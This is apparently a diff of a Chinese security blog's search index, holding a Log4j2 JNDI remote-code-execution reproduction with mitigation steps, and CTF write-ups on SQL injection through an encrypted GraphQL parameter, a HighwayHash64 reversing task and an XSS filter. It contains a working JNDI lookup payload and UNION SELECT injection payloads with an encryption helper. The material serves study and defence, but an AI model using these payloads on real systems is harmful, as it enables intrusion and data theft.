@@ -1,6 +1,71 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Apache Log4j2 RCE漏洞复现</title>
+    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
+<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
+<p>pom.xml文件如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>点击下载相应程序包资源</p>
+<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
+<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
+<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
+<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行结果:</p>
+<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
+<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
+<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
+<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
+<p><strong>已知影响组件</strong></p>
+<ul>
+<li>Apache Struts2</li>
+<li>Apache Solr</li>
+<li>Apache Flink</li>
+<li>Apache Druid</li>
+<li>ElasticSearch</li>
+<li>flume</li>
+<li>dubbo</li>
+<li>Redis</li>
+<li>logstash</li>
+<li>kafka</li>
+</ul>
+<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
+<p>2、升级至 log4j-2.15.0-rc2： </p>
+<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
+<p>3、紧急缓解措施： </p>
+<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
+<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
+<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
+<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
+<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
+<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web容器漏洞</category>
+        <category>Apache</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
     <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
@@ -84,6 +149,51 @@
       <tags>
         <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/</url>
+    <content><![CDATA[<p>title: CTF练习-Reverse系列-HighwayHash64<br>date: 2022-04-02 09:56:28<br>tags:<br>      -CTF<br>      -Reverse<br>      -HighwayHash64<br>categories:<br>       [CTF,逆向,HighwayHash64]</p>
+<h1 id="CTF练习-Reverse系列-HighwayHash64"><a href="#CTF练习-Reverse系列-HighwayHash64" class="headerlink" title="CTF练习-Reverse系列-HighwayHash64"></a>CTF练习-Reverse系列-HighwayHash64</h1><p>这道题运用highwayhash64算法，需要爆破hash的题目。程序首先对flag的长度进行hash校验，然后对flag里的数字进行校验，所以首先需要爆破flag长度，然后爆破flag内容。这里有两种方法，一种是修改源码进行源码，另外一种是直接修改exe为dll注入来爆破。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目探测"><a href="#题目探测" class="headerlink" title="题目探测"></a>题目探测</h3><p>这道题目所用的附件为一个exe文件，结果如下:</p>
+<p>显示题目描述为: hxb2018{xxxxx}。需要输入一串数字flag，输入其他字符串时提示退出。</p>
+<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323191950892.png" class title="image-20220323191950892">
+
+
+
+<p>首先判断该程序是否加壳以及程序位数，若经过加壳处理需要通过脱壳处理。</p>
+<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323192405521.png" class title="image-20220323192405521">
+
+<p>得出该程序为64位未加壳程序</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>将程序通过IDA打开该程序,在左边框中找到main主函数，然后按TAB键反汇编获得函数</p>
+<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401164832157.png" class title="image-20220401164832157">
+
+<p>我们来分析下这个程序流程。</p>
+<p>首先可以得出sub_140001880函数为控制台的输出函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;Please enter flag(Note:hxb2018&#123;digital&#125;:&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>然后通过gets_s()函数从标准的输入中读取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gets_s(Buffer, 0x104ui64);</span><br><span class="line">//gets_s(words,STLEN);</span><br></pre></td></tr></table></figure>
+
+<p>这里的长度限制为int(‘0x104’,’16’)&#x3D;260，当输入行太长时会丢弃输入行的其余字符，剩余的字符留在缓冲区成为下一读取语句的输入</p>
+<p>接下来查看sub_1400017A0函数，一个应该为输入的字符串，第二个为输入值的长度16进制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(v7, 4i64) != 0xD31580A28DD8E6C4ui64 )</span><br></pre></td></tr></table></figure>
+
+<p>下面也调用了该函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(&amp;Buffer[8], (unsigned int)v3) != 0xC886BDF39CB4ED72ui64 )</span><br></pre></td></tr></table></figure>
+
+<p>当判断成功时，会输出成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;successful!\nplease entry any key exit...&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>大致的意思应该为计算输入字符串进行哈希计算，然后判断是否为0xD31580A28DD8E6C4ui64，经后续判断为HighwayHash64摘要计算。</p>
+<h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><blockquote>
+<p>这里想到的解题思路为调用HighwayHash64算法对输入字符串进行爆破，当计算结果为0xD31580A28DD8E6C4ui64时即可</p>
+</blockquote>
+<p><a href="https://github.com/google/highwayhash">HighwayHash64</a></p>
+<p>这里首先跟进下sub_1400017A0函数，判断是否和HighwayHash64算法一致。</p>
+<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401182609549.png" class title="image-20220401182609549">
+
+]]></content>
   </entry>
   <entry>
     <title>CTF练习-Web系列-SQLI（一）</title>
@@ -184,126 +294,220 @@
       </tags>
   </entry>
   <entry>
-    <title>Apache Log4j2 RCE漏洞复现</title>
-    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
-<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>
+    <title></title>
+    <url>/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="CTF练习-Web系列-SQLI（二）"><a href="#CTF练习-Web系列-SQLI（二）" class="headerlink" title="CTF练习-Web系列-SQLI（二）"></a>CTF练习-Web系列-SQLI（二）</h1><p>infantsql这道题是前一道题的升级版本，只是在前端调用JSEncrpy第三方库利用公钥进行RSA加密id参数。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>首先对其搜索框进行注入点探测，可以看到id参数进行了加密</p>
+<img src="/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329145503383.png" class title="image-20220329145503383">
 
 
 
-<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
-<p>pom.xml文件如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+<p>然后查看题目前端 JS代码如何加密id参数,可以看到前端调用 JSEncrpy第三方库使用公钥对id参数进行加密处理  。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pkey = <span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIk4a0KYnqOLmJPxNGQkotihoo\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;994QXmk+7M8WCS5U7kWdhfMqiyjpKzuMaRB8Aydo2bbTNjHhATTRTUIvlpqNzEob\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;CSWuNFc3j3Nlk/I5ySdFo0INzlHnJtbwKQoHon0ctmyffovYNg5Ar8LPz6RbsiA7\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;3Ic4McekZIkdJH08cwIDAQAB\n&quot;</span>+</span><br><span class="line">        <span class="string">&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    <span class="keyword">var</span> ajax = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    ajax.open(<span class="string">&#x27;POST&#x27;</span>,<span class="string">&quot;/graphql&quot;</span>);</span><br><span class="line">    ajax.setRequestHeader(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> id = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>).value;</span><br><span class="line">    <span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">    encrypt.setPublicKey(pkey);</span><br><span class="line">    id = encrypt.encrypt(id);</span><br><span class="line">    id =  <span class="built_in">window</span>.btoa(id);</span><br><span class="line">    ajax.send(<span class="string">&quot;query=&#123;getscorewithid(id:\&quot;&quot;</span>+id+<span class="string">&quot;\&quot;)&#123; id name score &#125;&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ajax.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>) &#123;</span><br><span class="line">            alert(ajax.responseText);</span><br><span class="line">      　&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来的步骤和第一道是一样的，查询出存在的getscorewithname方法及其包含的参数name score</p>
+<h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><p>在注入过程中只需要使用 上方JS给定的公钥进行加密处理，然后放进请求包中即可进行注入查询</p>
+<p>js加密参数代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const parse = (str) =&gt; &#123;</span><br><span class="line">  const pkey = `-----BEGIN PUBLIC KEY-----</span><br><span class="line">  MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIk4a0KYnqOLmJPxNGQkotihoo</span><br><span class="line">  994QXmk+7M8WCS5U7kWdhfMqiyjpKzuMaRB8Aydo2bbTNjHhATTRTUIvlpqNzEob</span><br><span class="line">  CSWuNFc3j3Nlk/I5ySdFo0INzlHnJtbwKQoHon0ctmyffovYNg5Ar8LPz6RbsiA7</span><br><span class="line">  3Ic4McekZIkdJH08cwIDAQAB</span><br><span class="line">  -----END PUBLIC KEY-----`;</span><br><span class="line">  const jsEncrypt = new JSEncrypt()</span><br><span class="line">  jsEncrypt.setPublicKey(pkey);</span><br><span class="line">  const data = jsEncrypt.encrypt(str);</span><br><span class="line">  const result = window.btoa(data)</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line">parse(&quot;payload&quot;)</span><br></pre></td></tr></table></figure>
 
 
 
-<p>点击下载相应程序包资源</p>
-<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
-<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
-<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
-<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>查询数据库版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">parse(&quot;&#x27; UNION SELECT SQLITE_VERSION() &#x27;&quot;)</span><br><span class="line">// cVlHc25oQ3Y0NGRPV1JEaG56cFBEYWJEZzZqK0VJWjBkdHlnbk9WTU5sQmU4aWVFb3JWekN5clJtb081VFVXT2VWZTBpYjJGUy8va29EZGZSOGJpc0h2UkNJdVJ3bXVKWnVBOUhRTWxKYSs4MS9LR0hiSUpxL0VFY1BqMWFOdFVXbGsrcG9OMzlOL0xrTzBtT1h4T09kanVVVVNPMkZVam9CSnFIRFJrV3VjPQ==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">getscorewithname(name:&quot;cVlHc25oQ3Y0NGRPV1JEaG56cFBEYWJEZzZqK0VJWjBkdHlnbk9WTU5sQmU4aWVFb3JWekN5clJtb081VFVXT2VWZTBpYjJGUy8va29EZGZSOGJpc0h2UkNJdVJ3bXVKWnVBOUhRTWxKYSs4MS9LR0hiSUpxL0VFY1BqMWFOdFVXbGsrcG9OMzlOL0xrTzBtT1h4T09kanVVVVNPMkZVam9CSnFIRFJrV3VjPQ==&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329150800668.png" class title="image-20220329150800668">
 
 
 
-<p>运行结果:</p>
-<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
-<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
-<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
-<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
-<p><strong>已知影响组件</strong></p>
-<ul>
-<li>Apache Struts2</li>
-<li>Apache Solr</li>
-<li>Apache Flink</li>
-<li>Apache Druid</li>
-<li>ElasticSearch</li>
-<li>flume</li>
-<li>dubbo</li>
-<li>Redis</li>
-<li>logstash</li>
-<li>kafka</li>
-</ul>
-<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
-<p>2、升级至 log4j-2.15.0-rc2： </p>
-<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
-<p>3、紧急缓解措施： </p>
-<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
-<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
-<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
-<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
-<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
-<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
+<p>构造查询数据获取表名flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT (SELECT flag from flag)&#x27;</span><br><span class="line">//SzJYbWZzc29ackpCQWY1SFZPS2ZFZjlnbW5mRk5tV3V1dWp3bnhtcTFLTDc5TkhDenZKcXQybm90VmVKM2F1QjdISkVlS0piaDRkdXJyMXVPVmtTRUVGYjN1Q0JUUE9vblFNNlBqVk1qb0RUR1ZBbTd2OGtXbWxseXFkckR2UlhsTStLYXlTcCtJaHRKSjNrSm9jNlNXM3pJTzFBOGNMeEY2ckZsUDYyKzVFPQ==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;SzJYbWZzc29ackpCQWY1SFZPS2ZFZjlnbW5mRk5tV3V1dWp3bnhtcTFLTDc5TkhDenZKcXQybm90VmVKM2F1QjdISkVlS0piaDRkdXJyMXVPVmtTRUVGYjN1Q0JUUE9vblFNNlBqVk1qb0RUR1ZBbTd2OGtXbWxseXFkckR2UlhsTStLYXlTcCtJaHRKSjNrSm9jNlNXM3pJTzFBOGNMeEY2ckZsUDYyKzVFPQ==&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>得到flag为：flag{Rea1_flag_1s_Me}</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>CTF练习-Web系列-XSS</title>
+    <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/</url>
+    <content><![CDATA[<h1 id="CTF学习-Web系列-XSS"><a href="#CTF学习-Web系列-XSS" class="headerlink" title="CTF学习-Web系列-XSS"></a>CTF学习-Web系列-XSS</h1><p>这里记录下XSS类型的CTF题目</p>
+<h2 id="XSS0"><a href="#XSS0" class="headerlink" title="XSS0"></a>XSS0</h2><p>题目描述</p>
+<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-XSS/image-20220330104451485.png" class title="image-20220330104451485">
+
+<p>题目给出了一些代码，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$escaped = preg_replace(&quot;/[`&lt;&gt;ux]\\//&quot;, &quot;&quot;,$_GET[&#x27;payload&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//preg_replace()函数匹配替换</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        window.addEventListener(&quot;load&quot;, function() &#123;</span><br><span class="line">            var name = `&lt;?= $escaped ?&gt;`;</span><br><span class="line">            window.greeting.innerHTML = (name == &#x27;&#x27; ? &#x27;&#x27; : name);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p id=&quot;greeting&quot;&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;inject&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;payload&quot; placeholder=&quot;your payload here&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;src&lt;/h1&gt;</span><br><span class="line">&lt;?php highlight_string(file_get_contents(basename(__FILE__))); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到php将传入的参数进行匹配替换为空 ，正则表达式中的匹配规则将括号中的任意一字符和/字符组成的三元组进行匹配替换</p>
